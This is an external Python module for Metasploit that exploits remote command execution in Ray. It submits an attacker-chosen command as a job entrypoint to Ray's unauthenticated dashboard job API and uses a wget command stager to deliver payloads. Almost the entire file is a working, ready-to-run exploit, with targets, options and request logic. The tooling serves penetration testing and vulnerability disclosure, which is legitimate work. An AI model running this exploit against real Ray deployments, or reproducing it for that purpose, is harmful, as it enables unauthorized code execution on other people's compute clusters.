#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Session
except ImportError:
    dependencies_missing = True


metadata = {
    'name': 'Ray Agent Job RCE',
    'description': '''
        RCE in Ray via the agent job submission endpoint. This is intended functionality as Ray's main purpose is executing arbitrary workloads.
        By default Ray has no authentication.
    ''',
    'authors': [
        'sierrabearchell',
        'byt3bl33d3r <marcello@protectai.com>'
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/'},
        {'type': 'url', 'ref': 'https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'x64'},
        {'platform': 'linux', 'arch': 'x86'},
        {'platform': 'linux', 'arch': 'aarch64'}
    ],
    'payload': {
        'command_stager_flavor': 'wget'
    },
    'options': {
        'command': {'type': 'string', 'description': 'The command to execute', 'required': True, 'default': 'echo "Hello from Metasploit"'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 8265},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    try:
        base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
        s = Session()

        try:
            r = s.post(f"{base_url}/api/jobs/", json={"entrypoint": args["command"]})
            r.raise_for_status()
        except requests.exceptions.HTTPError:
            r = s.post(f"{base_url}/api/job_agent/jobs/", json={"entrypoint": args["command"]})
            r.raise_for_status()

    except requests.exceptions.HTTPError as e:
        logging.debug(f"{r.status_code} - body length: {len(r.text)}")
        logging.error(str(e))
        return

    job_data = r.json()
    logging.info(f"Command execution successful. Job ID: '{job_data['job_id']}' Submission ID: '{job_data['submission_id']}'")

if __name__ == '__main__':
    module.run(metadata, run)
